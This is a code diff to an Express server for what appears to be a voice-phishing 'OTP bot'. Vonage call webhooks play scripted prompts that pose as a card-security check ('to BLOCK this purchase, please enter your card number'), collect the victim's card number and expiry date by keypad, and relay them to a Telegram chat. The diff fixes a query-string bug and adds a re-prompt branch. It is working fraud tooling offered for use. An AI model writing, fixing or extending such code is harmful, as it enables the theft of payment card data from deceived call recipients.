@@ -309,6 +309,10 @@ app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
   const { askCardInfo, cardType } = req.query;
   const { language, chatId, step } = req.params;
 
+  console.log(
+    `${process.env.ENDPOINT_URL}/vonage-webhook/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+  );
+
   if (dtmf && dtmf.digits === '*') {
     await bot.telegram.sendMessage(
       chatId,
@@ -463,31 +467,53 @@ app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
             parse_mode: 'HTML',
           },
         );
-      }
-      return res.json([
-        {
-          action: 'talk',
-          text: `GREAT, you have entered ${dtmf.digits
-            .split('')
-            .join(
-              ' ',
-            )}. Please enter your ${cardType} card expiry date followed by the # key.`,
-          style: 2,
-          language,
-        },
-        {
-          eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/${step}/${chatId}/${language}?cardType=${cardType}&?expiry=yes`,
-          ],
-          action: 'input',
-          type: ['dtmf'],
-          dtmf: {
-            submitOnHash: true,
-            timeOut: 10,
-            maxDigits: 6,
+        return res.json([
+          {
+            action: 'talk',
+            text: `GREAT, you have entered ${dtmf.digits
+              .split('')
+              .join(
+                ' ',
+              )}. Please enter your ${cardType} card expiry date followed by the # key.`,
+            style: 2,
+            language,
           },
-        },
-      ]);
+          {
+            eventUrl: [
+              `${process.env.ENDPOINT_URL}/vonage-webhook/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+            ],
+            action: 'input',
+            type: ['dtmf'],
+            dtmf: {
+              submitOnHash: true,
+              timeOut: 10,
+              maxDigits: 6,
+            },
+          },
+        ]);
+      } else {
+        return res.json([
+          {
+            action: 'talk',
+            text: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
+            style: 2,
+            language: language,
+            bargeIn: true,
+          },
+          {
+            eventUrl: [
+              `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
+            ],
+            action: 'input',
+            type: ['dtmf'],
+            dtmf: {
+              submitOnHash: true,
+              timeOut: 10,
+              maxDigits: 18,
+            },
+          },
+        ]);
+      }
     default:
       break;
   }
